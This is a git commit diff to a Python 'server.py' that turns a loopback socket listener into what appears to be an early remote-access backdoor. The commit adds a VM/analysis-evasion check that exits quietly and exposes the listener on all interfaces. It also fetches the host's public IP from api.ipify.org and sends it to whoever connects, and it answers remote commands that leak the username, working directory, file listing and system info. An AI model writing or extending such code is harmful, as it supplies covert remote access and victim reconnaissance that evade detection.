74f506dc02c8ecac25cc404704bb4d4711d4459c
sonofice <55762307+sonofice@users.noreply.github.com>
2024-01-19 01:02:01 +0100

    added protection, pub IP locator, vm protection

--- server.py
+++ server.py
@@ -1,38 +1,54 @@
+import json, os
 from resources.misc import sysinfo
 from socket import socket, AF_INET, SOCK_STREAM
-from os import listdir, getlogin, path
+from resources.protection import proc_check, fake_mutex_code
+from requests import get
 
 port = 64780
-host_IP = "127.0.0.1"  # need to be loopback
+#host_IP = "127.0.0.1"  # need to be loopback
+
+if proc_check():
+    os.exit(0)
+
+
 
 with socket(AF_INET, SOCK_STREAM) as s:
-    s.bind((host_IP, port))
-    s.listen()
-    print("started listening")
-    conn, addr = s.accept()
+    s.bind(('', port))
+    #s.setblocking(False)
+    #s.listen(2)
+    #print("started listening")
+    #conn, addr = s.accept()
 
-    with conn:
-        while True:
+    while True:
 
-            s.listen()
+        try:
+            s.listen(2)
+            conn, addr = s.accept()
             print("listening")
-            data = conn.recv(2048)
-            print(data)
-            cmnd = data.decode()
-            print(cmnd)
+            ip = get('https://api.ipify.org').text
+            conn.sendall(bytes(ip, encoding="utf-8"))
+        except socket.error as msg:
+            s.close()
+            continue
 
-            if cmnd.lower() == "exit":
-                print("exiting")
-                break
-            elif cmnd.lower() == "pwd":
-                result = path.dirname(path.realpath(__file__))
-            elif cmnd.lower() == "user":
-                result = getlogin()
-            elif cmnd.lower() == "listdir":
-                result = listdir()
-            elif cmnd.lower() == "sysinfo":
-                result = sysinfo()
-            else:
-                result = "passing"
+        cmnd = conn.recv(2048).decode()
+        print(cmnd)
 
-            conn.sendall(bytes(result, encoding="utf-8"))
+        if cmnd.lower() == "kill":
+            print("exiting")
+            s.close()
+            break
+        elif cmnd.lower() == "pwd":
+            result = os.path.dirname(os.path.realpath(__file__))
+        elif cmnd.lower() == "user":
+            result = os.getlogin()
+        elif cmnd.lower() == "listdir":
+            result = json.dumps(os.listdir())
+            print (result)
+        elif cmnd.lower() == "sysinfo":
+            result = sysinfo()
+        else:
+            result = "passing"
+            continue
+
+        conn.sendall(bytes(result, encoding="utf-8"))
